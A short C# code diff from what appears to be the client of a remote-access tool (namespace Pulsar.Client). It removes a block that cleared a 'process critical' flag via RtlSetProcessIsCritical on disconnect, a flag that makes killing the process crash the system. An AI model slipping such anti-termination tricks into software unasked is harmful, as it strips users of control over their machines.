@@ -79,6 +79,7 @@ namespace Pulsar.Client.Messages
             try
             {
                 new ClientUninstaller().Uninstall();
+
                 _client.Exit();
             }
             catch (Exception ex)
@@ -89,11 +90,6 @@ namespace Pulsar.Client.Messages
 
         private void Execute(ISender client, DoClientDisconnect message)
         {
-            if (Settings.MAKEPROCESSCRITICAL && UAC.IsAdministrator())
-            {
-                NativeMethods.RtlSetProcessIsCritical(0, 0, 0);
-            }
-
             _client.Exit();
         }
 
